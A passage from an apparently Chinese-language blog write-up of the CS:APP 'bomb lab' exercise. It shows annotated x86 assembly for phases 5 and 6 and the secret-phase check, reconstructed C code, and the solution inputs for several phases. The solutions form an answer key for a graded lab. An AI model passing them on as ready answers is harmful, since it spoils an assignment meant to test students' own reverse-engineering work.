&lt;+89&gt;:add    $0x1c,%esp<br>   0x08048cd6 &lt;+92&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li>可以得到<code>func4</code>函数和主函数的C++代码如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span><br>&#123;<br><span class="hljs-keyword">if</span>(x&lt;=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x==<span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> y;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> func4(x<span class="hljs-number">-1</span>,y)+y+func4(x<span class="hljs-number">-2</span>,y);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;a&gt;&gt;b;<br>    <span class="hljs-keyword">if</span>(b&lt;=<span class="hljs-number">1</span>||b&gt;<span class="hljs-number">4</span>)<br>        explode_bomb();<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(func4(<span class="hljs-number">9</span>,b)!=a)<br>            explode_bomb();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>另写代码输出func4得到的第二个整数（只能为2、3、4）对应的第一个整数：</li></ul><p><img src="/2021/04/01/bomblab/image-20210512154349129.png" alt="image-20210512154349129"></p></li><li><p>输入这3组整数都能过关。</p><p><img src="/2021/04/01/bomblab/image-20210512154529595.png" alt="image-20210512154529595"></p><p><img src="/2021/04/01/bomblab/image-20210512155152270.png" alt="image-20210512155152270"></p><p><img src="/2021/04/01/bomblab/image-20210512155207546.png" alt="image-20210512155207546"></p></li></ul></li></ul><h4 id="5-phase-5"><a href="#5-phase-5" class="headerlink" title="5. phase_5"></a>5. phase_5</h4><ul><li><p>phase_5的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function phase_5:<br>   0x08048d39 &lt;+0&gt;:push   %ebx;保存ebx的原值<br>   0x08048d3a &lt;+1&gt;:sub    $0x18,%esp;esp=esp-0x18，预留0x18的栈帧空间<br>   0x08048d3d &lt;+4&gt;:mov    0x20(%esp),%ebx;ebx=M[0x20+esp],为输入的字符串<br>   0x08048d41 &lt;+8&gt;:mov    %ebx,(%esp);M[esp]=ebx<br>   0x08048d44 &lt;+11&gt;:call   0x8048fbb &lt;string_length&gt;<br>   ;调用函数&lt;string_length&gt;(phase_1中出现过),返回值为输入字符串的长度<br>   0x08048d49 &lt;+16&gt;:cmp    $0x6,%eax<br>   0x08048d4c &lt;+19&gt;:je     0x8048d53 &lt;phase_5+26&gt;;若eax=6则跳转<br>   0x08048d4e &lt;+21&gt;:call   0x80490e6 &lt;explode_bomb&gt;;否则爆炸<br>   0x08048d53 &lt;+26&gt;:mov    $0x0,%edx;edx=0<br>   0x08048d58 &lt;+31&gt;:mov    $0x0,%eax;eax=0<br>   0x08048d5d &lt;+36&gt;:movsbl (%ebx,%eax,1),%ecx;ecx=M(ebx+eax),高位用符号位补齐<br>   0x08048d61 &lt;+40&gt;:and    $0xf,%ecx;保留ecx的低四位（字符的ASCII码对16取余）<br>   0x08048d64 &lt;+43&gt;:add    0x804a200(,%ecx,4),%edx;edx=edx+M[0x804a200+4*ecx]<br>   0x08048d6b &lt;+50&gt;:add    $0x1,%eax;eax=eax+1<br>   0x08048d6e &lt;+53&gt;:cmp    $0x6,%eax<br>   0x08048d71 &lt;+56&gt;:jne    0x8048d5d &lt;phase_5+36&gt;;eax不等于6则跳转至&lt;phase_5+36&gt;,执行循环<br>   0x08048d73 &lt;+58&gt;:cmp    $0x2b,%edx<br>   0x08048d76 &lt;+61&gt;:je     0x8048d7d &lt;phase_5+68&gt;;若edx=0x2b 则过关<br>   0x08048d78 &lt;+63&gt;:call   0x80490e6 &lt;explode_bomb&gt;<br>   0x08048d7d &lt;+68&gt;:add    $0x18,%esp<br>   0x08048d80 &lt;+71&gt;:pop    %ebx<br>   0x08048d81 &lt;+72&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p>可见输入的字符串长度为6。在循环中，依次取字符串的1个字符，ASCII码对16取余，保存于ecx中。每次edx加上M[0x804a200+4*ecx]，相当于0x804a200为数组，ecx为数组的索引。</p></li><li><p>循环执行次数为6次。结束循环后，edx的值需为0x2b（即43）。</p><ul><li><p>查看首地址为0x804a200的数组保存的数字，数组长度为16，如下：</p><p><img src="/2021/04/01/bomblab/image-20210512202614163.png" alt="image-20210512202614163"></p><ul><li>需要在其中取6个数，和为43。可选择：13、10、12、4、3、1。（不唯一）</li><li>对应索引分别为：15、1、4、8、7、3，分别对应字符ASCII码的余数。</li></ul></li><li><p>对应字符可以为：O、A、D、H、G、C。（答案不唯一）</p></li></ul></li></ul></li></ul><ul><li><p>输入OADHGC，过关：</p><p><img src="/2021/04/01/bomblab/image-20210512203929992.png" alt="image-20210512203929992"></p></li></ul><h4 id="6-phase-6"><a href="#6-phase-6" class="headerlink" title="6. phase_6"></a>6. phase_6</h4><ul><li><p>phase_6的汇编代码（分为多个部分）如下：</p></li><li><p>第一部分：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function phase_6:<br>    0x08048d82 &lt;+0&gt;:push   %esi;esi入栈<br>    0x08048d83 &lt;+1&gt;:push   %ebx;ebx入栈<br>    0x08048d84 &lt;+2&gt;:sub    $0x44,%esp;esp=esp-0x44,栈帧预留0x44的空间<br>    0x08048d87 &lt;+5&gt;:lea    0x10(%esp),%eax;eax=(esp+0x10)<br>    0x08048d8b &lt;+9&gt;:mov    %eax,0x4(%esp);M[0x4+esp]=eax <br>    0x08048d8f &lt;+13&gt;:mov    0x50(%esp),%eax;eax=M[0x50+esp]=输入<br>    0x08048d93 &lt;+17&gt;:mov    %eax,(%esp);M[esp]=eax=输入<br>    0x08048d96 &lt;+20&gt;:call   0x804921b &lt;read_six_numbers&gt;<br>    ;调用函数&lt;read_six_numbers&gt;（phase_2中出现过），读入6个数，相当于读入首地址为(esp+0x10)的长度为6的int型数组a[]<br>    0x08048d9b &lt;+25&gt;:mov    $0x0,%esi;esi=0<br>    0x08048da0 &lt;+30&gt;:mov    0x10(%esp,%esi,4),%eax;eax=M[0x10+(esp+4*esi)]<br>    0x08048da4 &lt;+34&gt;:sub    $0x1,%eax;eax=eax-1=M[eax]-1<br>    0x08048da7 &lt;+37&gt;:cmp    $0x5,%eax<br>    0x08048daa &lt;+40&gt;:jbe    0x8048db1 &lt;phase_6+47&gt;;若eax&lt;=5(无符号)，则跳转至&lt;phase_6+47&gt;<br>    0x08048dac &lt;+42&gt;:call   0x80490e6 &lt;explode_bomb&gt;;否则爆炸<br>    0x08048db1 &lt;+47&gt;:add    $0x1,%esi;esi=esi+1<br>    0x08048db4 &lt;+50&gt;:cmp    $0x6,%esi<br>    0x08048db7 &lt;+53&gt;:je     0x8048dd4 &lt;phase_6+82&gt;;esi=6则跳转至&lt;phase_6+82&gt;<br>    0x08048db9 &lt;+55&gt;:mov    %esi,%ebx;ebx=esi<br>    0x08048dbb &lt;+57&gt;:mov    0x10(%esp,%ebx,4),%eax;eax=M[0x10+(esp+4*ebx)]<br>    0x08048dbf &lt;+61&gt;:cmp    %eax,0xc(%esp,%esi,4)<br>    0x08048dc3 &lt;+65&gt;:jne    0x8048dca &lt;phase_6+72&gt;<br>    ;若M[0xc+(esp+4*esi)]和eax不相等，则跳转至&lt;phase_6+72&gt;<br>    0x08048dc5 &lt;+67&gt;:call   0x80490e6 &lt;explode_bomb&gt;;否则爆炸<br>    0x08048dca &lt;+72&gt;:add    $0x1,%ebx;ebx=ebx+1<br>    0x08048dcd &lt;+75&gt;:cmp    $0x5,%ebx<br>    0x08048dd0 &lt;+78&gt;:jle    0x8048dbb &lt;phase_6+57&gt;<br>    ;若ebx&lt;=5，则跳转至&lt;phase_6+57&gt; -&gt; eax=M[0x10+(esp+4*ebx)]=a[ebx]<br>    0x08048dd2 &lt;+80&gt;:jmp    0x8048da0 &lt;phase_6+30&gt;<br>    ;否则跳转至&lt;phase_6+30&gt; -&gt; eax=M[0x10+(esp+4*esi)]=a[esi]<br></code></pre></div></td></tr></table></figure><ul><li><p>在读入6个数后，根据汇编代码可以推得对应的C++代码（数组为a[]）：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">5</span>;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(a[i]<span class="hljs-number">-1</span>&gt;<span class="hljs-number">5</span>||a[i]<span class="hljs-number">-1</span>&lt;<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">explode_bomb</span>();<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i+<span class="hljs-number">1</span>;j&lt;=<span class="hljs-number">5</span>;j++)<br>            <span class="hljs-keyword">if</span>(a[j]==a[i])<br>               <span class="hljs-built_in">explode_bomb</span>();    <br>&#125;<br><span class="hljs-comment">//结束后跳转至&lt;phase_6+82&gt;</span><br></code></pre></div></td></tr></table></figure><ul><li>这个双重循环确保数组a[]中的6个整数不相等且范围为[1,6]。</li></ul></li></ul><ul><li><p>第二部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">0x08048dd4 &lt;+82&gt;:lea    0x10(%esp),%eax;eax=(0x10+esp)<br>0x08048dd8 &lt;+86&gt;:lea    0x28(%esp),%ebx;ebx=(0x28+esp)<br>0x08048ddc &lt;+90&gt;:mov    $0x7,%ecx;ecx=7<br>0x08048de1 &lt;+95&gt;:mov    %ecx,%edx;edx=ecx=7<br>0x08048de3 &lt;+97&gt;:sub    (%eax),%edx;edx=edx-M[eax]=7-M[eax]<br>0x08048de5 &lt;+99&gt;:mov    %edx,(%eax);M[eax]=edx<br>0x08048de7 &lt;+101&gt;:add    $0x4,%eax;eax=eax+4<br>0x08048dea &lt;+104&gt;:cmp    %ebx,%eax<br>0x08048dec &lt;+106&gt;:jne    0x8048de1 &lt;phase_6+95&gt;;若eax!=ebx，则回跳至&lt;phase_6+95&gt;<br></code></pre></div></td></tr></table></figure><ul><li><p>这部分汇编代码写成C++代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;a[i]!=a[<span class="hljs-number">6</span>];i++)<br>&#123;<br>    a[i]=<span class="hljs-number">7</span>-a[i];<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>第三部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">0x08048dee &lt;+108&gt;:mov    $0x0,%ebx;ebx=0；<br>0x08048df3 &lt;+113&gt;:jmp    0x8048e0b &lt;phase_6+137&gt;;跳转至&lt;phase_6+137&gt;<br>0x08048df5 &lt;+115&gt;:mov    0x8(%edx),%edx;edx=M[0x8+edx]<br>0x08048df8 &lt;+118&gt;:add    $0x1,%eax;eax=eax+1<br>0x08048dfb &lt;+121&gt;:cmp    %ecx,%eax<br>0x08048dfd &lt;+123&gt;:jne    0x8048df5 &lt;phase_6+115&gt;;若eax!=ecx，回跳至&lt;phase_6+115&gt;<br>0x08048dff &lt;+125&gt;:mov    %edx,0x28(%esp,%esi,4);M[0x28+esp+4*esi]=edx<br>0x08048e03 &lt;+129&gt;:add    $0x1,%ebx;ebx=ebx+1<br>0x08048e06 &lt;+132&gt;:cmp    $0x6,%ebx<br>0x08048e09 &lt;+135&gt;:je     0x8048e22 &lt;phase_6+160&gt;;若ebx=6，跳转至&lt;phase_6+160&gt;（跳出循环）<br>0x08048e0b &lt;+137&gt;:mov    %ebx,%esi;esi=ebx<br>0x08048e0d &lt;+139&gt;:mov    0x10(%esp,%ebx,4),%ecx;ecx=M[0x10+esp+4*ebx]=a[ebx]<br>0x08048e11 &lt;+143&gt;:mov    $0x1,%eax;eax=1;<br>0x08048e16 &lt;+148&gt;:mov    $0x804c13c,%edx;edx=0x804c13c<br>;以上4行相当于初始化寄存器<br>0x08048e1b &lt;+153&gt;:cmp    $0x1,%ecx<br>0x08048e1e &lt;+156&gt;:jg     0x8048df5 &lt;phase_6+115&gt;;若a[ebx]&gt;1,跳转至&lt;phase_6+115&gt;<br>0x08048e20 &lt;+158&gt;:jmp    0x8048dff &lt;phase_6+125&gt;;否则跳转至&lt;phase_6+125&gt;<br></code></pre></div></td></tr></table></figure><ul><li><p>以<code>edx=0x804c13c</code>和<code>edx=M[0x8+edx]</code>为突破口，先查看<code>0x804c13c</code>存放的东西：</p><p><img src="/2021/04/01/bomblab/image-20210512225255740.png" alt="image-20210512225255740"></p><ul><li>由node联想到结点类（结构体），且地址<code>0x8+edx</code>存储的为指向下一结点的地址。</li></ul></li><li><p>依次查看结构体的信息如下，共有6个结构体：</p><p><img src="/2021/04/01/bomblab/image-20210512233328889.png" alt="image-20210512233328889"></p><ul><li>可以观察到结构体有一个值（val）、编号（id）、下一节点的地址（*next）构成，形成链表结构。</li></ul></li><li><p>可推成C++代码帮助理解，如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span><br>&#123;<br>  <span class="hljs-type">int</span> val;<br>  <span class="hljs-type">int</span> id;<br>  node *next;<br>&#125;;  <br>node *n[<span class="hljs-number">6</span>];<br>ebx=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>    esi=ebx;<br>ecx=a[ebx];<br>eax=<span class="hljs-number">1</span>;<br>edx=<span class="hljs-number">0x804c13c</span><span class="hljs-comment">//头结点的首地址</span><br>    <span class="hljs-keyword">if</span>(a[ebx]&gt;<span class="hljs-number">1</span>)<span class="hljs-comment">//数组a[]的范围为[1,6],只有a[ebx]等于1时不执行if内的循环。</span><br>    &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>    edx=M[<span class="hljs-number">0x8</span>+edx];<span class="hljs-comment">//下一结点地址</span><br>        eax++;<br>        &#125;<span class="hljs-keyword">while</span>(eax!=ecx);<span class="hljs-comment">//直到eax=a[ebx]时跳出循环，故循环次数为a[ebx]的值</span><br>    &#125;<br>    node[esi]=edx;<span class="hljs-comment">//故第i次循环是为了让原先的第a[i-1]个结点变为node[i-1]。 (i=ebx+1,esi=ebx)</span><br>    <span class="hljs-comment">//其中a[i-1]=(7-输入的第i个值)</span><br>    ebx++;<br>&#125;<span class="hljs-keyword">while</span>(ebx&lt;<span class="hljs-number">6</span>) <span class="hljs-comment">//共执行循环6次</span><br></code></pre></div></td></tr></table></figure><ul><li>故根据数组a[]的值，给6个node节点重新排列：让原先的第a[i-1]个结点变为node[i-1]。其中a[i-1]=(7-输入的第i个值)。</li></ul></li></ul></li><li><p>第四部分</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">   0x08048e22 &lt;+160&gt;:mov    0x28(%esp),%ebx;ebx=M[0x28+esp]--node[0]的地址<br>   0x08048e26 &lt;+164&gt;:mov    0x2c(%esp),%eax;eax=M[0x2c+esp]--node[1]的地址<br>   0x08048e2a &lt;+168&gt;:mov    %eax,0x8(%ebx);M[ebx+0x8]=eax--node[0].next=node[1]<br>   ;以下至&lt;+196&gt;都为连接结点、形成链表的操作<br>   0x08048e2d &lt;+171&gt;:mov    0x30(%esp),%edx<br>   0x08048e31 &lt;+175&gt;:mov    %edx,0x8(%eax)<br>   0x08048e34 &lt;+178&gt;:mov    0x34(%esp),%eax<br>   0x08048e38 &lt;+182&gt;:mov    %eax,0x8(%edx)<br>   0x08048e3b &lt;+185&gt;:mov    0x38(%esp),%edx<br>   0x08048e3f &lt;+189&gt;:mov    %edx,0x8(%eax)<br>   0x08048e42 &lt;+192&gt;:mov    0x3c(%esp),%eax<br>   0x08048e46 &lt;+196&gt;:mov    %eax,0x8(%edx)<br>   0x08048e49 &lt;+199&gt;:movl   $0x0,0x8(%eax);M[0x8+eax]=0，node[5].next=0(空)<br>   0x08048e50 &lt;+206&gt;:mov    $0x5,%esi;esi=5<br>   0x08048e55 &lt;+211&gt;:mov    0x8(%ebx),%eax;eax=M[0x8+ebx]--下一节点的地址<br>   0x08048e58 &lt;+214&gt;:mov    (%eax),%edx;edx=M[eax]--下一结点的值<br>   0x08048e5a &lt;+216&gt;:cmp    %edx,(%ebx)<br>   0x08048e5c &lt;+218&gt;:jge    0x8048e63 &lt;phase_6+225&gt;<br>   ;若M[ebx]&gt;=edx，即某结点的值不小于其后一个结点的值,则不会爆炸<br>   0x08048e5e &lt;+220&gt;:call   0x80490e6 &lt;explode_bomb&gt;;否则爆炸<br>   0x08048e63 &lt;+225&gt;:mov    0x8(%ebx),%ebx;ebx=M[ebx+0x8]--下一个结点的地址<br>   0x08048e66 &lt;+228&gt;:sub    $0x1,%esi;esi=esi-1 <br>   0x08048e69 &lt;+231&gt;:jne    0x8048e55 &lt;phase_6+211&gt;;当esi!=0时，回跳至&lt;phase_6+211&gt;,执行循环<br>   ;故执行&lt;+211&gt;到&lt;+231&gt;的次数为6。<br>   0x08048e6b &lt;+233&gt;:add    $0x44,%esp;恢复栈帧，过关。<br>   0x08048e6e &lt;+236&gt;:pop    %ebx<br>   0x08048e6f &lt;+237&gt;:pop    %esi<br> 0x08048e70 &lt;+238&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p>故phase_6要求输入6个数，根据这6个数，对带值（val）的6个结点进行重新排序，使得结点的值降序排列。</p></li><li><p>根据之前查看的结点信息：</p><p><img src="/2021/04/01/bomblab/image-20210512233328889-1625373895945.png" alt="image-20210512233328889"></p><p>可以列表如下：</p><p>| 原结点编号 |  1   |   2   |   3   |  4   |   5   |  6   |<br>| :————: | :—: | :—-: | :—-: | :—: | :—-: | :—: |<br>|    原值    | 0xdf | 0x252 | 0x376 | 0xea | 0x2fb | 0xf3 |<br>|  目标编号  |  6   |   3   |   1   |  5   |   2   |  4   |</p></li><li><p>让原先的第a[i]个结点变为node[i]，故数组<code>a[6]=&#123;3,5,2,6,4,1&#125;</code></p></li><li><p>故输入<code>（7-a[i]）</code>为<code>4 2 5 1 3 6</code>，过关截图如下：</p><p><img src="/2021/04/01/bomblab/image-20210513114343306.png" alt="image-20210513114343306"></p></li></ul></li></ul><h4 id="7-phase-defused-含secret-phase"><a href="#7-phase-defused-含secret-phase" class="headerlink" title="7. phase_defused (含secret_phase)"></a>7. phase_defused (含secret_phase)</h4><ul><li><p>看似结束了。但回到<code>bomb.c</code>，在生成炸弹后，和输入有关的函数中，我们还有两个函数还没查看汇编代码，分别为<code>read_line()</code>、<br><code>phase_defused()</code>。何况邪恶博士Dr. Evil还留下了这样一句话，好似幸灾乐祸：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps</span><br><span class="hljs-comment"> * something they overlooked?  Mua ha ha ha ha! */</span><br><span class="hljs-comment">//哇，他们明白了！ 但是，是不是……缺少了什么？ 也许他们忽略了什么？ 哇哈哈哈哈哈！</span><br></code></pre></div></td></tr></table></figure></li><li><p>先看了看<code>read_line()</code>，就是对一行输入进行花里胡哨的处理后保存在指定地址，没有什么特别之处。</p></li><li><p>而<code>phase_defused()</code>的汇编代码如下：</p><ul><li>第一部分：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function phase_defused:<br>   0x0804926b &lt;+0&gt;:sub    $0x8c,%esp<br>   0x08049271 &lt;+6&gt;:mov    %gs:0x14,%eax;取gs:0x14处的值<br>   0x08049277 &lt;+12&gt;:mov    %eax,0x7c(%esp);置于M[0x7c+esp]<br>   0x0804927b &lt;+16&gt;:xor    %eax,%eax;ZF=1<br>   0x0804927d &lt;+18&gt;:cmpl   $0x6,0x804c3cc;比较M[0x804c3cc]和6的值<br>   0x08049284 &lt;+25&gt;:jne    0x80492f8 &lt;phase_defused+141&gt;;不相等则跳过secret_phase，故我们要让其相等<br></code></pre></div></td></tr></table></figure><ul><li><p>猜测6和我们的关卡数量有关。故在进入每个关卡的函数的位置设断点，观察<code>0x804c3cc</code>的变化情况：</p><ul><li><p>进入关卡1前，<code>M[0x804c3cc]=0</code>： </p><p><img src="/2021/04/01/bomblab/image-20210513200430515.png" alt="image-20210513200430515"></p></li><li><p>进入关卡1后，<code>M[0x804c3cc]=1</code>:</p><p><img src="/2021/04/01/bomblab/image-20210513200542728.png" alt="image-20210513200542728"></p></li><li><p>进入关卡2后，<code>M[0x804c3cc]=2</code>:</p><p><img src="/2021/04/01/bomblab/image-20210513200748969.png" alt="image-20210513200748969"></p></li><li><p>进入关卡3后，<code>M[0x804c3cc]=3</code>:</p><p><img src="/2021/04/01/bomblab/image-20210513200806250.png" alt="image-20210513200806250"></p></li><li><p>进入关卡4后，<code>M[0x804c3cc]=4</code>:</p><p><img src="/2021/04/01/bomblab/image-20210513201243594.png" alt="image-20210513201243594"></p></li><li><p>进入关卡5后，<code>M[0x804c3cc]=5</code>:</p><p><img src="/2021/04/01/bomblab/image-20210513201259639.png" alt="image-20210513201259639"></p></li><li><p>进入关卡6后，<code>M[0x804c3cc]=6</code>:</p><p><img src="/2021/04/01/bomblab/image-20210513201315080.png" alt="image-20210513201315080"></p></li></ul></li><li><p>显然只有在第6关之后，<code>M[0x804c3cc]=6</code>，才可能进入secret_phase。</p></li><li><p>第二部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">0x08049286 &lt;+27&gt;:lea    0x2c(%esp),%eax;eax=(0x2c+esp)<br>0x0804928a &lt;+31&gt;:mov    %eax,0x10(%esp);M[0x10+esp]=eax=(0x2c+esp)<br>0x0804928e &lt;+35&gt;:lea    0x28(%esp),%eax;eax=(0x28+esp)<br>0x08049292 &lt;+39&gt;:mov    %eax,0xc(%esp);M[0xc+esp]=eax=(0x28+esp)<br>0x08049296 &lt;+43&gt;:lea    0x24(%esp),%eax;eax=(0x24+esp)<br>0x0804929a &lt;+47&gt;:mov    %eax,0x8(%esp);M[0x8+esp]=eax=(0x24+esp)<br>0x0804929e &lt;+51&gt;:movl   $0x804a3d1,0x4(%esp);M[0x4+esp]=eax=0x804a3d1<br>0x080492a6 &lt;+59&gt;:movl   $0x804c4d0,(%esp);M[esp]=0x804c4d0--从该位置读入<br>0x080492ad &lt;+66&gt;:call   0x8048870 &lt;__isoc99_sscanf@plt&gt;<br>0x080492b2 &lt;+71&gt;:cmp    $0x3,%eax;输入参数个数应等于3<br>0x080492b5 &lt;+74&gt;:jne    0x80492ec &lt;phase_defused+129&gt;;否则不会到达scret_phase<br></code></pre></div></td></tr></table></figure><ul><li><p>调用<code>&lt;__isoc99_sscanf@plt&gt;</code>从0x804c4d0读入参数。根据函数的参数可知，共读入3个参数分别保存在<code>(0x24+esp)</code>、<code>(0x28+esp)</code>、<code>(0x2c+esp)</code>。输入参数的格式为地址<code>0x804a3d1</code>所示：</p><p><img src="/2021/04/01/bomblab/image-20210513203029685.png" alt="image-20210513203029685"></p></li></ul></li><li><p>第三部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs 